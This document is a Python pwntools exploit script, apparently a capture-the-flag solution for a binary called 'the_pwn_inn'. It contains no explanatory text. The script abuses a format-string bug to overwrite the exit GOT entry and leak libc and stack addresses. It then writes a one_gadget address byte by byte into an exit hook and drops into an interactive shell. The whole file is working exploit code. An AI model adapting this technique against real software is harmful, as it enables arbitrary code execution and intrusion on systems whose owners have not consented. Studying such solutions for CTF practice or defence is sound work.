from pwn import * 

context.log_level = 'debug'
sh = process('./the_pwn_inn')
gdb.attach(sh, 'b * 0x401319')


one = [0x45226, 0x4527a, 0xf0364, 0xf1207]

exit_got = 0x404058
start_addr = 0x4010C0

sh.recvuntil('your name? \n')
payload = '%' + str(0xc0) + 'c' + '%9$hhn%21$p%25$p'
L = len(payload)
payload += 'a' * (8 - L % 8)
payload += p64(exit_got)
sh.sendline(payload)


sh.recvuntil('0x')
Text = '0x' + sh.recv(12)
log.success('Text:' + Text)
libcbase = int(Text, 16) - 0x78c0f
log.success('libcbase: ' + hex(libcbase))
sh.recvuntil('0x')
Stack_base = int('0x' + sh.recv(12), 16)
log.success('Stack_base: ' + hex(Stack_base))


one_gadget = hex(one[1] + libcbase)
log.success(one_gadget)

exit_hook = 0x5f0f50 + libcbase

for i in range(6, 0, -1):
    log.success(one_gadget[2*i:2*i+2])
    sh.recvuntil('your name? \n')
    payload = '%' + str(int('0x' + one_gadget[2*i:2*i+2], 16)) + 'c' + '%8$hhn'
    L = len(payload)
    payload += 'a' * (8 - L % 8)
    payload += p64(exit_hook + 6 - i)
    sh.sendline(payload)


sh.recvuntil('your name? \n')
payload = '%' + str(0x30) + 'c' + '%8$hhn'
L = len(payload)
payload += 'a' * (8 - L % 8)
payload += p64(exit_got)
sh.sendline(payload)




sh.interactive()
